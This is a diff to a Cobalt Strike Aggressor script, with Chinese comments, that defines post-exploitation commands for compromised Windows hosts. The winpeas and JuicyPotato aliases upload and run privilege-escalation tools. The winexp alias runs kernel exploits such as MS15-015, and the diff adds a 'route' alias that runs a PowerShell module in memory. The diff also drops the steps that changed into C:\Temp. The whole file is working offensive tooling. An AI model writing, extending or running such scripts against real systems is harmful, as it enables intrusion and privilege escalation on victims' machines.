@@ -19,12 +19,9 @@ bind Ctrl+L{
 
 alias winpeas{
 	if ($2 eq "del"){
-		bcd($1, "C:\\Temp");
 		brm($1, "winpeas.bat");
 	}else{
 		bupload($1, script_resource("winPEAS.bat"));
-		bmv($1, "winPEAS.bat", "C:\\Temp\\winpeas.bat");
-		bcd($1, "C:\\Temp");
 		bshell($1, "winpeas.bat");
 	}
 }
@@ -39,12 +36,9 @@ alias JuicyPotato{
 			bshell($1, "JuicyPotato.exe ".$command);
 		}
 	}else if($args eq "del"){
-			bcd($1, "C:\\Temp");
 			brm($1, "JuicyPotato.exe");
 	}else{
 			bupload($1, script_resource("JuicyPotato.exe"));
-			# bmv($1, "JuicyPotato.exe", "C:\\Temp\\JuicyPotato.exe");
-			bcd($1, "C:\\Temp");
 			bshell($1, "JuicyPotato.exe");
 	}
 }
@@ -99,4 +93,11 @@ alias winexp{
 		blog2($1, "winexp MS15-015.exe \"whoami\" #执行exp");
 		blog2($1, "最多支持6个参数的exp，如果需要多个参数执行：winexp replace exp.exe@-d@1@-c@{11111111-11111111-11111111}@-p@whoami")
 	}
+}
+
+alias route{
+	$handle = openf(script_resource("modules\\route.ps1"));
+	$text = readb($handle, -1); 
+	closef($handle);
+	bpowerpick($1, $text);
 }
